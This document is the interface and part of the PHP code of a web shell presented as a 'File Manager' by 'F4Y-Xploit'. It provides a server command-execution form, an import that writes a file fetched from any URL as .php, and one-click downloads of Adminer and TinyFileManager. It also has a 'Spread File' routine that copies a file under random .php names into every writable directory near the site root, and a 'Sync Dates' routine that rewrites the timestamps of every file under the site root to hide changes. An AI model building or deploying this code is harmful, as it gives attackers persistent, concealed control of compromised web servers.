<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js'></script>
<style>
:root {
    --red-accent: #c0392b;
    --red-dim: rgba(192,57,43,0.18);
    --red-border: rgba(192,57,43,0.28);
    --navbar-bg: #140303;
    --body-bg: #0e0e0e;
}
body { padding-top: 70px; background: var(--body-bg) !important; }
.navbar { position: fixed; top: 0; left: 0; right: 0; z-index: 1030; background: var(--navbar-bg) !important; border-bottom: 1px solid var(--red-border); }
.navbar-brand { color: var(--red-accent) !important; font-weight: 700; letter-spacing: .5px; padding-left: 1rem; }
a { text-decoration: none; }
.clipboard-cut { background-color: #ffc10720; }
.clipboard-copy { background-color: #17a2b820; }
#batchActionsContainer { display: none; }
.path-display { font-size: 0.9em; margin-bottom: 10px; color: rgba(255,255,255,0.5); }
.table-responsive-custom { overflow-x: auto; width: 100%; }
.table { min-width: 700px; }
.table tbody tr.active-row { background-color: rgba(192,57,43,0.12) !important; }
.table tbody tr:hover { background-color: rgba(192,57,43,0.07) !important; transition: background .1s; }
.navbar-nav .nav-item { margin-right: 4px; }
.navbar-nav .nav-item .btn {
    background: rgba(192,57,43,0.15);
    border: 1px solid var(--red-border);
    color: #fff;
    padding: .4rem .7rem;
    display: flex; align-items: center; justify-content: center;
    width: auto; border-radius: 6px;
    transition: background .15s;
}
.navbar-nav .nav-item .btn:hover,
.navbar-nav .nav-item .btn:focus,
.navbar-nav .nav-item .btn:active {
    background: rgba(192,57,43,0.35) !important;
    border-color: rgba(192,57,43,0.6) !important;
    box-shadow: none;
}
.navbar-nav .nav-item .btn.btn-success,
.navbar-nav .nav-item .btn.btn-primary,
.navbar-nav .nav-item .btn.btn-info,
.navbar-nav .nav-item .btn.btn-warning,
.navbar-nav .nav-item .btn.btn-danger {
    background: rgba(192,57,43,0.15) !important;
    border-color: var(--red-border) !important;
    color: #fff !important;
}
.navbar-nav .nav-item .btn i { margin-right: 6px; }
.btn-success { background: var(--red-accent) !important; border-color: var(--red-accent) !important; }
.btn-success:hover { background: #a93226 !important; border-color: #a93226 !important; }
</style>
<script>
window.onload = () => {
    
    const renameModalElement = document.getElementById('renameModal');
    if (renameModalElement && renameModalElement.dataset.show === 'true') {
        const renameModal = new bootstrap.Modal(renameModalElement);
        renameModal.show();
    }

    const checkboxes = document.querySelectorAll('input[name=\"selected_items[]\"]');
    checkboxes.forEach(checkbox => {
        checkbox.addEventListener('change', updateBatchActionsVisibility);
    });
    updateBatchActionsVisibility();

    const tableRows = document.querySelectorAll('.table tbody tr');
    tableRows.forEach(row => {
        row.addEventListener('click', function(event) {
            // Hindari klik pada checkbox, tautan, tombol, atau sel yang berisi checkbox agar tidak menghilangkan highlight
            // Check if the clicked element or any of its parents (up to <td>) is an interactive element
            let target = event.target;
            while(target !== this && target !== null) {
                if (target.type === 'checkbox' || target.tagName === 'A' || target.tagName === 'BUTTON') {
                    return; // Don't highlight the row if an interactive element within it was clicked
                }
                target = target.parentElement;
            }

            // Hapus kelas 'active-row' dari semua baris
            tableRows.forEach(r => r.classList.remove('active-row'));
            // Tambahkan kelas 'active-row' ke baris yang sedang diklik
            this.classList.add('active-row');
        });
    });
};

function confirmAction(action) {
    if (action === 'delete') {
        return confirm('Anda yakin ingin menghapus item yang dipilih? Aksi ini tidak dapat dibatalkan.');
    } else if (action === 'zip') {
        return confirm('Anda yakin ingin mengarsipkan item yang dipilih?');
    } else if (action === 'copy') {
        return confirm('Anda yakin ingin menyalin item yang dipilih ke clipboard?');
    } else if (action === 'cut') {
        return confirm('Anda yakin ingin memotong item yang dipilih ke clipboard?');
    }
    return true;
}

function toggleAll(source) {
    checkboxes = document.querySelectorAll('input[name=\"selected_items[]\"]');
    for(var i=0, n=checkboxes.length;i<n;i++) {
        checkboxes[i].checked = source.checked;
    }
    updateBatchActionsVisibility();
}

function updateBatchActionsVisibility() {
    const selectedCheckboxes = document.querySelectorAll('input[name=\"selected_items[]\"]:checked');
    const batchActionsContainer = document.getElementById('batchActionsContainer');
    if (selectedCheckboxes.length > 0) {
        batchActionsContainer.style.display = 'flex';
    } else {
        batchActionsContainer.style.display = 'none';
    }
}

function showRenameModal(oldPath, currentName) {
    document.getElementById('renameOldPath').value = oldPath;
    document.getElementById('renameNewName').value = currentName;
    const renameModal = new bootstrap.Modal(document.getElementById('renameModal'));
    renameModal.show();
}

function showChmodModal(itemPath, currentPermsOctal) {
    document.getElementById('chmodPath').value = itemPath;
    document.getElementById('chmodOctal').value = currentPermsOctal;

    const ownerPerms = parseInt(currentPermsOctal[1]);
    const groupPerms = parseInt(currentPermsOctal[2]);
    const othersPerms = parseInt(currentPermsOctal[3]);

    document.getElementById('owner_read').checked = (ownerPerms & 4);
    document.getElementById('owner_write').checked = (ownerPerms & 2);
    document.getElementById('owner_execute').checked = (ownerPerms & 1);

    document.getElementById('group_read').checked = (groupPerms & 4);
    document.getElementById('group_write').checked = (groupPerms & 2);
    document.getElementById('group_execute').checked = (groupPerms & 1);

    document.getElementById('others_read').checked = (othersPerms & 4);
    document.getElementById('others_write').checked = (othersPerms & 2);
    document.getElementById('others_execute').checked = (othersPerms & 1);

    updateOctalFromCheckboxes();

    const chmodModal = new bootstrap.Modal(document.getElementById('chmodModal'));
    chmodModal.show();
}

function updateOctalFromCheckboxes() {
    let owner = 0;
    if (document.getElementById('owner_read').checked) owner += 4;
    if (document.getElementById('owner_write').checked) owner += 2;
    if (document.getElementById('owner_execute').checked) owner += 1;

    let group = 0;
    if (document.getElementById('group_read').checked) group += 4;
    if (document.getElementById('group_write').checked) group += 2;
    if (document.getElementById('group_execute').checked) group += 1;

    let others = 0;
    if (document.getElementById('others_read').checked) others += 4;
    if (document.getElementById('others_write').checked) others += 2;
    if (document.getElementById('others_execute').checked) others += 1;

    document.getElementById('chmodOctal').value = '0' + owner.toString() + group.toString() + others.toString();
}

document.addEventListener('DOMContentLoaded', function() {
    const chmodCheckboxes = document.querySelectorAll('#chmodModal input[type=\"checkbox\"]');
    chmodCheckboxes.forEach(checkbox => {
        checkbox.addEventListener('change', updateOctalFromCheckboxes);
    });
});

function clearCmdOutput() {
    window.location.href = "?action=cmd&d=" + encodeURIComponent("<?php echo $cwd; ?>");
}
</script>
</head>
<body class='p-4'>

<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <div class="container-fluid">
    <a class="navbar-brand" href="?d=<?php echo urlencode($cwd); ?>">File Manager</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <li class="nav-item">
             <a class="btn btn-secondary nav-link" href="<?php echo htmlspecialchars($self); ?>"><i class='fa fa-home'></i> Home</a>
        </li>
        <li class="nav-item">
          <button class="btn nav-link" data-bs-toggle="modal" data-bs-target='#createModal'><i class='fa fa-plus'></i> New File/Folder</button>
        </li>
        <li class="nav-item">
          <button class="btn nav-link" data-bs-toggle='modal' data-bs-target='#uploadModal'><i class='fa fa-upload'></i> Upload</button>
        </li>
        <?php if (!empty($clipboard_items)): ?>
        <li class="nav-item">
          <form method='post' class='d-inline-block'>
              <input type='hidden' name='paste_item' value='1'>
              <button type='submit' class='btn nav-link'><i class='fa fa-paste'></i> Paste (<?php echo ($clipboard_type === 'cut' ? 'Cut' : 'Copy') . " " . count($clipboard_items); ?>)</button>
          </form>
        </li>
        <?php endif; ?>
        <li class="nav-item">
          <a href='?action=password&d=<?php echo urlencode($cwd); ?>' class='btn nav-link'><i class='fa fa-lock'></i> Password</a>
        </li>
        <li class="nav-item">
          <a href='?action=info&d=<?php echo urlencode($cwd); ?>' class='btn nav-link'><i class='fa fa-info-circle'></i> Info</a>
        </li>
        <li class="nav-item">
        <?php if (function_exists('proc_open')): ?>
          <a href='?action=cmd&d=<?php echo urlencode($cwd); ?>' class='btn nav-link'><i class='fa fa-terminal'></i> CMD</a>
        <?php else: ?>
          <button class='btn nav-link' disabled title='CMD dinonaktifkan di server ini'><i class='fa fa-terminal'></i> CMD</button>
        <?php endif; ?>
        </li>
		
		
	
		

<?php
if (isset($_GET['action']) && $_GET['action'] === 'downloadadminer') {
    $url = 'https://github.com/vrana/adminer/releases/download/v5.4.1/adminer-5.4.1-en.php';
    $targetFile = __DIR__ . '/adminer-5.4.1-en.php';
    $msg = '';

    if (!is_writable(__DIR__)) {
        $msg = 'not have prem';
    } else {
        $data = @file_get_contents($url);
        if ($data === false) {
            $msg = 'download failed';
        } elseif (file_put_contents($targetFile, $data) === false) {
            $msg = 'not have prem';
        } else {
            $msg = 'Adminer Added';
        }
    }

    echo "<script>window.location.href = window.location.href.split('?')[0] + '?msg=" . urlencode($msg) . "';</script>";
    exit;
}
?>

<li class="nav-item">
    <button class="btn nav-link" type="button" onclick="window.location.href='?action=downloadadminer'">
        <i class="fa"></i> Adminer
    </button>
</li>




<?php
if (isset($_GET['action']) && $_GET['action'] === 'downloadtiny') {
    $url = 'https://raw.githubusercontent.com/prasathmani/tinyfilemanager/refs/heads/master/tinyfilemanager.php';
    $targetFile = __DIR__ . '/tinyfilemanager.php';
    $msg = '';

    if (!is_writable(__DIR__)) {
        $msg = 'not have prem';
    } else {
        $data = @file_get_contents($url);
        if ($data === false) {
            $msg = 'download failed';
        } elseif (file_put_contents($targetFile, $data) === false) {
            $msg = 'not have prem';
        } else {
            $msg = 'Tiny Added';
        }
    }
    
    echo "<script>window.location.href = window.location.href.split('?')[0] + '?msg=" . urlencode($msg) . "';</script>";
    exit;
}
?>





<li class="nav-item">
    <button class="btn nav-link" type="button" onclick="window.location.href='?action=downloadtiny'">
        <i class="fa"></i> TinyFilemanager
    </button>
</li>




<?php		
// --- START SPREAD LOGIC ---
if (isset($_POST['action']) && $_POST['action'] === 'spread_local') {
    $filename = isset($_POST['filename']) ? basename($_POST['filename']) : '';
	
	
	$sourceFile = __DIR__ . DIRECTORY_SEPARATOR . $filename;

// شاخه اصلی سایت
$root = realpath($_SERVER['DOCUMENT_ROOT'] ?? '');

if ($root === false || !is_dir($root)) {
    $root = __DIR__;
}




    $msg = "";

    if ($filename === '' || !is_file($sourceFile)) {
        $msg = "Error: File not found.";
    } else {
        $content = file_get_contents($sourceFile);
        $created = [];
        $dirs = [$root];

      
        function scanDirsSafe($dir, &$results, $depth = 0) {
            if ($depth > 2) return; 
            $exclude = ['.', '..', '.git', 'node_modules', 'vendor', 'cache', 'tmp', 'logs'];
            $list = @scandir($dir);
            if (!$list) return;
            foreach ($list as $item) {
                if (in_array($item, $exclude, true)) continue;
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                if (@is_dir($path) && @is_writable($path)) {
                    $results[] = $path;
                    scanDirsSafe($path, $results, $depth + 1);
                }
            }
        }

        scanDirsSafe($root, $dirs);

foreach ($dirs as $dir) {
    if (!@is_writable($dir)) {
        continue;
    }


    do {
        $randomName = substr(str_shuffle(md5(uniqid(mt_rand(), true))), 0, 10) . '.php';
        $target = $dir . DIRECTORY_SEPARATOR . $randomName;
    } while (@file_exists($target));

    if (@file_put_contents($target, $content) !== false) {
        $created[] = $target;
    }


        }
        @file_put_contents($root . DIRECTORY_SEPARATOR . 'results.txt', implode(PHP_EOL, $created));
        $msg = "Success: " . count($created) . " files created.";
    }
    
    
    echo "<script>window.location.href = window.location.pathname + '?p=" . (isset($_GET['p']) ? urlencode($_GET['p']) : '') . "&msg=" . urlencode($msg) . "';</script>";
    exit;
}
?>

<style>

    background: rgba(0, 0, 0, 0.4); 
    transition: none !important;
  }

    transform: none !important;
    transition: none !important;
    margin-top: 10%;
  }
</style>


<li class="nav-item">
    <button type="button" class="btn nav-link" id="openSpreadModal">
        <i class="fa fa-copy"></i> Spread File
    </button>
</li>


<div class="modal" id="spreadLocalModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="false">
    <div class="modal-dialog">
        <form method="post">
            <input type="hidden" name="action" value="spread_local">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Spread Local File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Filename in current folder</label>
                        <input type="text" name="filename" class="form-control" placeholder="e.g. index.html" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="submit" class="btn btn-primary">Start</button>
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                </div>
            </div>
        </form>
    </div>
</div>


<script>
document.addEventListener('DOMContentLoaded', function () {
    const btn = document.getElementById('openSpreadModal');
    const modalEl = document.getElementById('spreadLocalModal');

    if (!btn || !modalEl || typeof bootstrap === 'undefined') return;


    const modal = new bootstrap.Modal(modalEl, {
        backdrop: false,
        keyboard: true
    });

    btn.addEventListener('click', function (e) {
        e.preventDefault();
        modal.show();
    });


    modalEl.addEventListener('hidden.bs.modal', function () {
        document.querySelectorAll('.modal-backdrop').forEach(function (el) {
            el.remove();
        });
        document.body.classList.remove('modal-open');
        document.body.style.removeProperty('overflow');
        document.body.style.removeProperty('padding-right');
    });
});
</script>


<?php
// --- START TOUCH LOGIC ---

function touchAll($dir, $ts, &$ok, &$fail, &$skip) {
    $items = @scandir($dir);

   
    if ($items === false) {
        $skip++;
        return;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $path = $dir . DIRECTORY_SEPARATOR . $item;

       
        if (is_link($path)) {
            $skip++;
            continue;
        }

        if (is_dir($path)) {
            touchAll($path, $ts, $ok, $fail, $skip);
        }

        if (@touch($path, $ts)) {
            $ok++;
        } else {
            $fail++;
        }
    }
}

if (
    $_SERVER['REQUEST_METHOD'] === 'POST' &&
    ($_POST['action'] ?? '') === 'touch_all'
) {
    @set_time_limit(0);

    $targetDate = trim($_POST['target_date'] ?? '');
    $dateObject = DateTime::createFromFormat('Y-m-d\TH:i', $targetDate);

    if (!$dateObject) {
        $msg = 'Error: Invalid date and time.';
    } else {
        $root = realpath($_SERVER['DOCUMENT_ROOT']);

        if (!$root || !is_dir($root)) {
            $msg = 'Error: Site root was not found.';
        } else {
            $ok = 0;
            $fail = 0;
            $skip = 0;

            touchAll($root, $dateObject->getTimestamp(), $ok, $fail, $skip);

            
            if (@touch($root, $dateObject->getTimestamp())) {
                $ok++;
            } else {
                $fail++;
            }

            $msg = "Updated: {$ok} | Failed: {$fail} | Skipped: {$skip} | " .
                   $dateObject->format('Y-m-d H:i');
        }
    }

    $redirectUrl = $_SERVER['PHP_SELF'] . '?msg=' . urlencode($msg);

    echo '<script>window.location.href=' .
         json_encode($redirectUrl, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP) .
         ';</script>';
    exit;
}

// --- END TOUCH LOGIC ---
?>






<li class="nav-item">
    <button type="button"
            class="btn nav-link"
            data-bs-toggle="modal"
            data-bs-target="#touchModal"
            data-bs-backdrop="false"
            data-bs-keyboard="true">
        <i class="fa fa-clock"></i> Sync Dates
    </button>
</li>



<div class="modal"
     id="touchModal"
     tabindex="-1"
     aria-labelledby="touchModalTitle"
     aria-hidden="true"
     data-bs-backdrop="false"
     data-bs-keyboard="true">

    <div class="modal-dialog">
        <form method="post">
            <input type="hidden" name="action" value="touch_all">

            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="touchModalTitle">
                        Sync Files Date &amp; Time
                    </h5>

                    <button type="button"
                            class="btn-close"
                            data-bs-dismiss="modal"
                            aria-label="Close"></button>
                </div>

                <div class="modal-body">
                    <p class="text-muted small">
                        This will update the Last Modified time of all files and folders
                        from the document root.
                    </p>

                    <div class="mb-3">
                        <label for="target_date" class="form-label">
                            Select Date and Time
                        </label>

                        <input type="datetime-local"
                               id="target_date"
                               name="target_date"
                               class="form-control"
                               required>
                    </div>
                </div>

                <div class="modal-footer">
                    <button type="submit" class="btn btn-warning">
                        Apply to All
                    </button>

                    <button type="button"
                            class="btn btn-secondary"
                            data-bs-dismiss="modal">
                        Cancel
                    </button>
                </div>
            </div>
        </form>
    </div>
</div>





		
      </ul>
      <button onclick='toggleTheme()' class='btn btn-dark'><i class='fa fa-adjust'></i> Theme</button>
    </div>
  </div>
</nav>

<div class="container-fluid pt-3">
<?php if ($msg) echo "<div class='alert alert-info mt-3'>" . $msg . "</div>"; ?>
<?php if (isset($_GET['cmd_output']) && $_GET['action'] === 'cmd'): // Only show cmd_output if on cmd action page ?>
    <div class='alert alert-secondary mt-3'>Output:<br><?php echo urldecode($_GET['cmd_output']); ?></div>
<?php endif; ?>
<br><br>

<div class="table-responsive-custom mb-3">
    <table class='table table-bordered table-sm'>
        <thead>
            <tr>
                <th>
    <i class='fa fa-folder'></i><span style="font-weight: bold;"> <?php echo breadcrumbs($cwd, $self); ?></span>
                </th>
            </tr>
        </thead>
    </table>
</div>


<?php
if (isset($_GET['action'])) {
    // Add margin-top to "Kembali" button
    echo "<a href='?d=" . urlencode($cwd) . "' class='btn btn-sm btn-secondary mb-3 mt-2'><i class='fa fa-arrow-left'></i> Kembali</a>";
    if ($_GET['action'] === 'password') {
        echo "<form method='post' class='mb-3'>
        <label for='setpass' class='form-label'>Set New Password:</label>
        <input type='password' name='setpass' id='setpass' class='form-control mb-2' placeholder='Enter new password'>
        <button class='btn btn-warning'>Simpan Password</button></form>
        <form method='post' class='mt-2'>
        <input type='hidden' name='delpass' value='1'>
        <button class='btn btn-danger'>Hapus Password</button></form>";
    } elseif ($_GET['action'] === 'info') {
        echo '<div class="container">
        <h1 class="mb-3">File Manager - F4Y-Xploit</h1>
        <hr>
        <p><strong>Author:</strong> <span style="color:#0f0">F4Y-Xploit</span></p>
        <p><strong>Contact:</strong> <a href="https://t.me/Fayanzo" target="_blank">Telegram</a></p>
        <p><strong>Tujuan Pembuatan:</strong></p>
        <ul>
            <li>Manajemen file berbasis web tanpa FTP</li>
            <li>Dapat digunakan untuk remote control file di hosting atau VPS</li>
            <li>Dilengkapi fitur upload, edit, rename, hapus, proteksi password, dan theme toggle</li>
        </ul>
        <p class="text-muted">Versi: 1.0 | Update terakhir: Juli 2025</p>
    </div>';

    } elseif ($_GET['action'] === 'cmd') {
        if (!function_exists('proc_open')) {
            echo "<div class='alert alert-warning'>Fungsi eksekusi perintah (CMD) dinonaktifkan di server ini oleh penyedia hosting Anda.</div>";
        }
        echo "<form method='post' class='mt-3'>
        <label for='command_input' class='form-label'>Execute Command:</label>
        <div class='input-group mb-2'>
            <input name='command' id='command_input' placeholder='Enter command' class='form-control'>
            <button type='submit' class='btn btn-primary' name='cmd_exec'>Execute</button>
            <button type='button' class='btn btn-outline-secondary' onclick='clearCmdOutput()'>Clear Output</button>
        </div>
        </form>";

        // Command History
        if (!empty($_SESSION['cmd_history'])) {
            echo "<h6 class='mt-4'>Command History:</h6>
            <div class='list-group mb-3' style='max-height: 200px; overflow-y: auto;'>";
            foreach ($_SESSION['cmd_history'] as $hist_cmd) {
                echo "<a href='#' class='list-group-item list-group-item-action list-group-item-secondary' onclick='document.getElementById(\"command_input\").value = \"" . addslashes($hist_cmd) . "\"; return false;'>" . htmlspecialchars($hist_cmd) . "</a>";
            }
            echo "</div>
            <form method='post'>
                <button type='submit' name='clear_cmd_history' class='btn btn-sm btn-danger' onclick='return confirm(\"Yakin ingin menghapus riwayat perintah?\")'>Clear History</button>
            </form>";
        }

        // NEW: Import Raw File from URL
        echo "<h6 class='mt-4'>📥 Import Raw File from URL:</h6>
        <form method='post' class='mb-3'>
            <label for='url_to_download_raw' class='form-label'>🔗 URL Raw File:</label>
            <input type='url' name='url_to_download_raw' id='url_to_download_raw' placeholder='https://example.com/raw.txt' class='form-control mb-2' required>

            <label for='filename_to_save' class='form-label'>💾 Save As (filename):</label>
            <input type='text' name='filename_to_save' id='filename_to_save' placeholder='hasil.php' class='form-control mb-2' required>

            <button type='submit' class='btn btn-success' name='download_url_and_save'>Download & Save</button>
        </form>";
    }
    echo "</div></body></html>";
    exit;
}
?>

<form method='post' id='batch_form'>
<div class="table-responsive-custom">
<table class='table table-bordered table-sm'><thead>
<tr><th><input type='checkbox' onclick='toggleAll(this)'></th><th>Name</th><th>Size</th><th>Last Modified</th><th>Perms</th><th>Actions</th></tr></thead><tbody>
<?php
foreach (list_dir($cwd) as $i) {
    $n = htmlspecialchars($i['name']);
    $p = htmlspecialchars($i['path']);
    $encoded_p = urlencode($i['path']);
    // perms_to_octal also needs realpath or a path that fileperms can resolve
    $file_perms_octal = perms_to_octal(@fileperms($i['path'])); // Use @ for fileperms as it can fail

    $row_class = '';
    if (in_array(realpath($i['path']), $clipboard_items)) {
        $row_class = 'clipboard-' . $clipboard_type;
    }

    echo "<tr class='" . $row_class . "'>";
    echo "<td><input type='checkbox' name='selected_items[]' value='" . $encoded_p . "'></td>";
    echo "<td>" . ($i['is_dir'] ? "<a href='?d=" . $encoded_p . "'><i class='fa fa-folder-o'></i> $n</a>" : "<i class='fa fa-file-o'></i> $n") . "</td>";
    echo "<td>" . formatSize($i['size']) . "</td>";
    echo "<td>" . date('Y-m-d H:i', $i['mtime']) . "</td>";
    echo "<td>" . perms($i['path']) . " ($file_perms_octal)</td>";
    echo "<td class='d-flex flex-wrap gap-1'>"
    . (!$i['is_dir'] ? "<a href='?edit=" . $encoded_p . "&d=" . urlencode($cwd) . "' class='btn btn-sm btn-warning'><i class='fa fa-edit'></i></a>" : "")
    . (!$i['is_dir'] ? "<a href='?download=" . $encoded_p . "&d=" . urlencode($cwd) . "' class='btn btn-sm btn-success'><i class='fa fa-download'></i></a>" : "") // New download button
    . "<button type='button' class='btn btn-sm btn-secondary' onclick='showRenameModal(\"" . $encoded_p . "\", \"" . $n . "\")'><i class='fa fa-pencil'></i></button>"
    . "<button type='button' class='btn btn-sm btn-dark' onclick='showChmodModal(\"" . $encoded_p . "\", \"" . $file_perms_octal . "\")'><i class='fa fa-key'></i></button>"
    . "<a href='?delete=" . $encoded_p . "&d=" . urlencode($cwd) . "' class='btn btn-sm btn-danger' onclick='return confirm(\"Yakin ingin menghapus " . ($i['is_dir'] ? "folder ini beserta isinya" : "file ini") . "?\")'><i class='fa fa-trash-o'></i></a>"
    . (preg_match('/\.(zip)$/i', $n) && !$i['is_dir'] ? "<a href='?unzip=" . $encoded_p . "&d=" . urlencode($cwd) . "' class='btn btn-sm btn-info' onclick='return confirm(\"Yakin ingin mengekstrak file ini?\")'><i class='fa fa-file-archive-o'></i></a>" : "")
    . "</td></tr>";

}
?>
</tbody></table>
</div>

<div class='mb-3 d-flex gap-2' id='batchActionsContainer'>
    <select name='batch_action' class='form-select' style='width:auto;'>
        <option value='delete'>Delete</option>
        <option value='zip'>Zip</option>
        <option value='copy'>Copy</option>
        <option value='cut'>Cut</option>
    </select>
    <button type='submit' class='btn btn-primary' onclick='return confirmAction(this.form.batch_action.value);'>Executed</button>
</div>
</form>

<div class="modal fade" id="uploadModal" tabindex="-1" aria-labelledby="uploadModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="uploadModalLabel">Upload File</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <form method="post" enctype="multipart/form-data">
        <div class="modal-body">
          <input type="file" name="uploadfile" class="form-control">
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
          <button type="submit" class="btn btn-primary" name="uploadfile">Upload</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal fade" id="createModal" tabindex="-1" aria-labelledby="createModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="createModalLabel">Create New</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <h6><i class='fa fa-file-code-o'></i> Create New File</h6>
        <form method="post" class="mb-4">
          <input name="newfile" placeholder="File Name (e.g., index.php)" class="form-control mb-2" required>
          <textarea name="filedata" class="form-control mb-2" placeholder="File Content (optional)" rows="5"></textarea>
          <button type="submit" class="btn btn-success">Create File</button>
        </form>

        <hr>

        <h6><i class='fa fa-folder-open-o'></i> Create New Folder</h6>
        <form method="post">
          <input name="newfolder" placeholder="Folder Name (e.g., my_new_dir)" class="form-control mb-2" required>
          <button type="submit" class="btn btn-success">Create Folder</button>
        </form>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="renameModalLabel">Rename Item</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <form method="post">
        <div class="modal-body">
          <input type="hidden" name="old_path_rename" id="renameOldPath">
          <div class="mb-3">
            <label for="renameNewName" class="form-label">New Name:</label>
            <input type="text" name="new_name" id="renameNewName" class="form-control" required>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
          <button type="submit" class="btn btn-primary" name="rename_submit">Rename</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="chmodModalLabel">Change Permissions (CHMOD)</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <form method="post">
        <div class="modal-body">
          <input type="hidden" name="chmod_path" id="chmodPath">
          <div class="mb-3">
            <label for="chmodOctal" class="form-label">Octal Permissions:</label>
            <input type="text" name="chmod_octal" id="chmodOctal" class="form-control" pattern="[0-7]{3,4}" title="Use 3 or 4 octal digits (e.g., 0755)" required>
            <small class="form-text text-muted">Example: 755 (rwxr-xr-x), 644 (rw-r--r--)</small>
          </div>
          <div class="mb-3">
            <h6>Symbolic Permissions:</h6>
            <div class="row">
              <div class="col-4">
                <strong>Owner</strong><br>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="owner_read">
                  <label class="form-check-label" for="owner_read">Read</label>
                </div>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="owner_write">
                  <label class="form-check-label" for="owner_write">Write</label>
                </div>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="owner_execute">
                  <label class="form-check-label" for="owner_execute">Execute</label>
                </div>
              </div>
              <div class="col-4">
                <strong>Group</strong><br>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="group_read">
                  <label class="form-check-label" for="group_read">Read</label>
                </div>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="group_write">
                  <label class="form-check-label" for="group_write">Write</label>
                </div>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="group_execute">
                  <label class="form-check-label" for="group_execute">Execute</label>
                </div>
              </div>
              <div class="col-4">
                <strong>Others</strong><br>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="others_read">
                  <label class="form-check-label" for="others_read">Read</label>
                </div>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="others_write">
                  <label class="form-check-label" for="others_write">Write</label>
                </div>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="others_execute">
                  <label class="form-check-label" for="others_execute">Execute</label>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
          <button type="submit" class="btn btn-primary" name="set_chmod">Apply CHMOD</button>
        </div>
      </form>
    </div>
  </div>
</div>

</body>
</html>
